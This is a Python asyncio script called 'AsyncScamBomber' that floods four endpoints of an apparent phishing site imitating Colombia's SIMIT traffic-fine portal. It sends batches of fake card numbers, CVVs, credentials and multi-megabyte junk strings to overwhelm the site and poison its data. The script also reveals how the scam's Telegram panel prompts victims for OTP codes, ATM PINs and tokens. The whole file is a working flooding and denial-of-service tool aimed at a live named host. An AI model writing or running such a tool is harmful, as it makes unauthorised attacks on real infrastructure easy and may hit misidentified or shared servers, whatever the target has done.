import aiohttp
import asyncio
import random
import string
import json
from typing import Dict, Any
import time
import signal
import sys


class AsyncScamBomber:
    def __init__(self):
        self.base_urls = {
            'botmaster': 'https://fcmsimit.co/dinadatos/botmaster2.php',
            'loadtiket': 'https://fcmsimit.co/hidden/loadtiketid.php',
            'guardar': 'https://fcmsimit.co/guardar_datos_reales.php',
            'telegram': 'https://fcmsimit.co/log_telegram.php'
        }
        self.request_count = 0
        self.total_bytes_sent = 0
        self.session = None
        self.start_time = None
        self.is_running = True

        # Setup signal handler for Ctrl+C
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        print("\n\nInterrupted by user...")
        self.is_running = False
        self.display_stats()
        sys.exit(0)

    async def create_session(self):
        """Create aiohttp session with connection pooling"""
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=50)
        timeout = aiohttp.ClientTimeout(total=100)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)

    async def close_session(self):
        """Close the session properly"""
        if self.session:
            await self.session.close()

    def display_stats(self):
        """Display statistics including bytes sent"""
        if self.start_time:
            end_time = time.time()
            total_time = end_time - self.start_time

            bytes_per_request = self.total_bytes_sent / max(1, self.request_count)
            mb_sent = self.total_bytes_sent / (1024 * 1024)
            throughput_mbps = (self.total_bytes_sent / (1024 * 1024)) / max(1, total_time)

            print("\n" + "=" * 60)
            print("📊 BOMBARDMENT STATISTICS")
            print("=" * 60)
            print(f"📨 Total Requests Sent: {self.request_count:,}")
            print(f"💾 Total Bytes Sent: {self.total_bytes_sent:,} bytes")
            print(f"📊 Data Volume: {mb_sent:.2f} MB")
            print(f"⏱️  Time Elapsed: {total_time:.2f} seconds")
            print(f"🚀 Requests/Second: {self.request_count / max(1, total_time):.2f}")
            print(f"📡 Data Rate: {throughput_mbps:.2f} MB/s")
            print(f"📦 Avg Request Size: {bytes_per_request:.0f} bytes")
            print("=" * 60)

    def calculate_payload_size(self, data, is_json=False):
        """Calculate the size of the payload in bytes"""
        if is_json:
            return len(json.dumps(data).encode('utf-8'))
        else:
            # For form data, calculate total size of key-value pairs
            total_size = 0
            for key, value in data.items():
                total_size += len(key.encode('utf-8')) + len(str(value).encode('utf-8')) + 1  # +1 for '='
            return total_size

    def generate_random_string(self, length: int) -> str:
        """Generate random string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def generate_realistic_id(self) -> str:
        """Generate ID"""
        prefix = random.choice(['mlo', 'abc', 'xyz', 'usr', 'id_', 'gen'])
        return prefix + self.generate_random_string(16)

    def generate_card_number(self) -> str:
        """Generate fake card number"""
        return ''.join(random.choices(string.digits, k=16))

    def generate_phone(self) -> str:
        """Generate phone number"""
        return ''.join(random.choices(string.digits, k=random.randint(10, 15)))

    def generate_message_body(self) -> Dict[str, Any]:
        """Generate form data"""
        user_id = self.generate_realistic_id()
        card_num = self.generate_card_number()

        message = f"""🎉 SACAM SIMIT 🎉
💳 Nuevo método de pago pendiente de verificación.
--------------------------------------------------
🆔 ID: | {user_id}
👤 Usuario: | {self.generate_random_string(12)}
🔐 Clave: | {self.generate_random_string(8)}
--------------------------------------------------
📋 Detalles del pago:
----------------------------
🪪 Cédula: | {self.generate_random_string(8)}
💳 Tarjeta: | {card_num}
📅 Fecha de expiración: | {random.randint(1, 12):02d}/{random.randint(23, 30)}
🔐 CVV: | {random.randint(100, 999)}
💳 Tipo de tarjeta: | {random.choice(['Visa', 'Mastercard'])}
💰 Cuotas: | {random.randint(1, 12)}
💰 Monto: | $ {random.randint(10000, 500000):,}
--------------------------------------------------
🏦 Banco: | {random.choice(['Bancolombia', 'Davivienda', 'BBVA'])}
🏠 Dirección: | {self.generate_random_string(20000)}
📞 Teléfono: | {self.generate_phone()}
🏙️ Ciudad: | {random.choice(['Bogotá', 'Medellín', 'Cali'])}
📝 Nombre del propietario: | {self.generate_random_string(10000)}"""

        keyboard = {
            "inline_keyboard": [
                [{"text": "Pedir Dinámica", "callback_data": f"pedir_dinamica:{user_id}"}],
                [{"text": "Pedir Clave de Cajero", "callback_data": f"pedir_cajero:{user_id}"}],
                [{"text": "Pedir Código OTP", "callback_data": f"pedir_otp:{user_id}"}],
                [{"text": "Pedir Token", "callback_data": f"pedir_token:{user_id}"}],
                [{"text": "Error de TC", "callback_data": f"error_tc:{user_id}"}],
                [{"text": "Error de Logo", "callback_data": f"error_logo:{user_id}"}]
            ]
        }

        return {'message': message, 'keyboard': json.dumps(keyboard)}

    def generate_json_payload(self) -> Dict[str, Any]:
        """Generate JSON payload"""
        return {
            "cardNumber": self.generate_card_number(),
            "expMonth": str(random.randint(1, 12)),
            "expYear": str(random.randint(23, 30)),
            "cvv": str(random.randint(100, 999)),
            "cuotas": str(random.randint(1, 12)),
            "ownerName": self.generate_random_string(1000000),
            "cedula": self.generate_random_string(8),
            "phone": self.generate_phone(),
            "city": random.choice(['Bogotá', 'Medellín', 'Cali']),
            "address": self.generate_random_string(25),
            "email": f"{self.generate_random_string(8)}@gmail.com",
            "country": "CO",
            "state": random.choice(['Cundinamarca', 'Antioquia', 'Valle']),
            "district": self.generate_random_string(6),
            "zip": str(random.randint(10000, 99999)),
            "additionalInfo": self.generate_random_string(1500000),
            "amount": random.randint(10000, 500000)
        }

    def generate_telegram_payload(self, tipo: str) -> Dict[str, Any]:
        """Generate Telegram payload"""
        placa = self.generate_random_string(60000).upper()
        timestamp = f"202{random.randint(4, 6)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}T{random.randint(10, 23):02d}:{random.randint(10, 59):02d}:{random.randint(10, 59):02d}.{random.randint(100, 999)}Z"

        if tipo == "RESULTADO_CON_MULTAS":
            return {
                "tipo": "RESULTADO_CON_MULTAS",
                "timestamp": timestamp,
                "placa": placa,
                "cantidad_multas": random.randint(1, 5),
                "total_original": random.randint(100000, 500000),
                "total_con_descuento": random.randint(50000, 150000),
                "nota": random.choice(["MULTAS GENERADAS", "PROCESO COMPLETADO"])
            }
        elif tipo == "CLIC_PAGAR":
            return {
                "tipo": "CLIC_PAGAR",
                "timestamp": timestamp,
                "placa": placa,
                "cantidad_multas": random.randint(1, 5),
                "total": random.randint(50000, 200000)
            }
        else:
            return {
                "tipo": "BUSQUEDA_INICIADA",
                "timestamp": timestamp,
                "placa": placa
            }

    async def send_single_request(self, url: str, data: Dict[str, Any], is_json: bool = False):
        """Send a single async request and track bytes"""
        try:
            # Calculate payload size before sending
            payload_size = self.calculate_payload_size(data, is_json)

            if is_json:
                async with self.session.post(url, json=data) as response:
                    self.request_count += 1
                    self.total_bytes_sent += payload_size
                    print(
                        f"Request #{self.request_count} to {url.split('/')[-1]} - Status: {response.status} - Size: {payload_size} bytes")
            else:
                async with self.session.post(url, data=data) as response:
                    self.request_count += 1
                    self.total_bytes_sent += payload_size
                    print(
                        f"Request #{self.request_count} to {url.split('/')[-1]} - Status: {response.status} - Size: {payload_size} bytes")

        except Exception as e:
            self.request_count += 1
            # Still count the bytes even if request fails (we tried to send them)
            self.total_bytes_sent += payload_size
            print(f"Request #{self.request_count} failed: {str(e)} - Attempted Size: {payload_size} bytes")

    async def bomb_single_cycle(self):
        """Send all requests for one cycle asynchronously"""
        if not self.is_running:
            return

        tasks = []

        form_data = self.generate_message_body()
        tasks.append(self.send_single_request(self.base_urls['botmaster'], form_data))

        json_data = self.generate_json_payload()
        tasks.append(self.send_single_request(self.base_urls['loadtiket'], json_data, True))
        tasks.append(self.send_single_request(self.base_urls['guardar'], json_data, True))

        for telegram_type in ["BUSQUEDA_INICIADA", "RESULTADO_CON_MULTAS", "CLIC_PAGAR"]:
            telegram_data = self.generate_telegram_payload(telegram_type)
            tasks.append(self.send_single_request(self.base_urls['telegram'], telegram_data, True))

        # Execute all requests concurrently
        await asyncio.gather(*tasks, return_exceptions=True)

    async def bomb_scam(self, total_cycles: int = 500, batch_size: int = 50):
        """Main bombing function with async batching"""
        self.start_time = time.time()
        await self.create_session()

        print(f"Starting with {total_cycles} cycles...")
        print(f"Tracking bytes sent...\n")

        # Process in batches
        for batch in range(0, total_cycles, batch_size):
            if not self.is_running:
                break

            current_batch_size = min(batch_size, total_cycles - batch)

            print(f"📦 Sending batch {batch // batch_size + 1} with {current_batch_size} cycles...")

            # Create tasks for current batch
            tasks = [self.bomb_single_cycle() for _ in range(current_batch_size)]

            await asyncio.gather(*tasks, return_exceptions=True)

            if batch + batch_size < total_cycles and self.is_running:
                await asyncio.sleep(0.1)

        await self.close_session()

        self.display_stats()


async def main():
    bomber = AsyncScamBomber()

    try:
        await bomber.bomb_scam(total_cycles=200, batch_size=100)
    except Exception as e:
        print(f"Unexpected error: {e}")
        bomber.display_stats()
    finally:
        await bomber.close_session()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nProgram terminated by user")
